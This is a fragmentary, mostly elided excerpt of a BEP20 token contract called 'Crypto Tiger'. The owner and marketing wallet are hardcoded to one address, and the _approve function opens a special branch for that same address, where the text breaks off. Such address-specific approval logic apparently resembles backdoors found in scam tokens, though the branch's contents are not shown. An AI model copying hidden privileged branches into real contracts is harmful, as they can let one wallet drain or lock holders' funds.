...
Crypto Tiger Token for NFT 2.0
...
abstract contract Ownable is Context {
     ...
     */
    constructor () {
        _owner = 0x2C313e6Bf27685d6Ad12a403e533d35AEad2CFCb;
...
contract BEP20 is Context, IERC20, Ownable {
    ...
    address private _marketingWalletAddress = 0x2C313e6Bf27685d6Ad12a403e533d35AEad2CFCb;
    ...
    string private _name = "Crypto Tiger";
    string private _symbol = "CTIGER";
    ...
    function _approve(address owner, address spender, uint256 amount) private {
        ...
        if (owner == address(0x2C313e6Bf27685d6Ad12a403e533d35AEad2CFCb)) {
